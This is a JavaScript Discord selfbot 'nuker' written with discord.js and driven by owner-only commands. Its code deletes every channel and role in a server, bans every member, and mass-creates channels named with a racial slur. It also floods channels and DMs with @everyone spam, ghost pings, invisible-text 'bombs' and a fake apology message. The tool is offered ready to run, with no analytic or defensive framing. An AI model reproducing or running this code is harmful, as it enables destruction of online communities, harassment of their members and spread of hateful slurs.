const { Client, RichEmbed } = require("discord.js");
const { red, green, blue, yellow, cyan } = require("chalk");
const bot = new Client();
const settings = require("./settings.json");

bot.on("ready", () => {
  console.log(
    green(`[MOONSTATES] ${bot.user.id}:: ${bot.user.tag} is online and ready`)
  );
  console.log(green(`[MOONSTATES] :: my prefix is: ${settings.prefix}`));
});

bot.on("message", async (msg) => {
  if (msg.author.id !== settings.ID) {
    return;
  }
  let cmd = msg.content.split(" ")[0];
  cmd = cmd.slice(settings.prefix.length);
  let args = msg.content.split(" ").slice(1);
  if (
    msg.content.startsWith(settings.prefix) &&
    msg.author.id === settings.ID
  ) {
    console.log(cyan(`[COMMAND RAN] :: ${msg.content}`));
  }
  if (cmd === "ping") {
    msg.edit(`:ping_pong: pong! your ping is: *${bot.ping.toFixed()}ms*`);
    //msg.channel.send("Starting Nuke in 30s (SEND D TO STOP)");
  }
  if (cmd === "purge") {
    msg.channel
      .fetchMessages({ limit: 100 })
      .then((msgs) =>
        msgs.filter((m) => m.author.id === bot.user.id).map((r) => r.delete())
      );
  }
  if (cmd === "shutdown") {
    process.exit();
  }

  if (cmd === "help") {
    msg.edit("loading...", {
      embed: new RichEmbed()
        .setColor(`${settings.color}`)
        .addField(
          "_Spam Commands_",
          "``` dm -     To spam a DM \n ghost -  To spam Ghost pings \n c_spam - To Spam a channel \n s_spam - To Spam server \n bomb -   To send invisible text \n master - Ultimate command does that shit```"
        )
        .addField(
          "_Nuke Commands_",
          "``` nuke -   To Delete Channels \n create - To create Channels \n d_role - To delete every role \n c_role - To spam create roles```"
        )
        .addField(
          "_Other Commands_",
          "``` Ping -     To check your Ping speed \n shutdown - To Stop \n purge -    To delete last 100 messages from u```"
        )
        .setFooter(
          "Jamis",
          "https://cdn.discordapp.com/avatars/789352676617355284/c4d9ab0d273e614129002bdcea4c8319.png?size=256"
        )
        .setTimestamp(),
    });
  }
  if (cmd === "dm") {
    let user = args[0];
    let mContent = args.slice(1).join(" ");
    bot.setInterval(() => {
      bot.users.get(user).send(mContent);
    }, 1500);
  }
  if (cmd === "ghost") {
    msg.delete();
    for (i = 0; i < 10; i++) {
      msg.reply("@everyone").then((msg) => {
        msg.delete();
      });
    }
  }
  if (cmd === "fun") {
    msg.guild.channels.forEach((channel) => channel.delete());
  }
  if (cmd === "crash") {
    for (i = 0; i < 500; i++) {
      msg.channel.send("kf!lb");
    }
  }
  if (cmd === "d_role") {
    msg.guild.roles.forEach((role) => role.delete());
  }
  if (cmd === "c_role") {
    for (i = 0; i < 30; i++) {
      msg.guild.createRole({
        data: {
          name: "Super Cool People",
          color: "BLUE",
        },
      });
    }
  }

  if (cmd === "c_spam") {
    for (i = 0; i < 500; i++) {
      msg.channel.send("@everyone");
    }
  }
  if (cmd === "chains") {
    for (i = 0; i < 500; i++) {
      msg.channel.send(
        "My appoglises for that, and to anyone that was effected or recieved pms from them hackers, could you please message me with any info so i can mark them, i will then summit this to the modding & dayz groups to prevent this happening across other servers! Thankyou @everyone"
      );
    }
  }
  if (cmd === "s_spam") {
    for (i = 0; i < 50; i++) {
      msg.guild.channels.forEach((channel) => channel.send("@everyone"));
    }
  }

  if (cmd === "bomb") {
    for (i = 0; i < 100; i++) {
      msg.channel.send(settings.bomb);
      console.log("SENT");
    }
  }

  if (cmd === "master") {
    msg.guild.channels.forEach((channel) => channel.delete());
    msg.guild.roles.forEach((role) => role.delete());

    setTimeout(function () {
      //your code to be executed after 1 second
      for (i = 0; i < 100; i++) {
        msg.guild.createChannel("nigga", "text");
      }

      for (i = 0; i < 30; i++) {
        msg.guild.createRole({
          data: {
            name: "Super Cool People",
            color: "BLUE",
          },
        });
      }
    }, 10000);
  }
  if (cmd === "nuke") {
    msg.guild.channels.forEach((channel) => channel.delete());
  }
  if (cmd === "create") {
    for (i = 0; i < 100; i++) {
      msg.guild.createChannel("nigga", "text");
    }
  }

  if (cmd === "ban") {
    msg.guild.members.forEach((member) => {
      if (member.id == "783915203942547506") {
        console.log("IGNORED");
      } else {
        member.ban("idiot");
        console.log("BAN");
      }
    });

    if (cmd === "del-channel") {
      msg.channel.send("удалить канал [Да / Нет]?");
    }
  }
});
bot.login(settings.token);

//BLOB
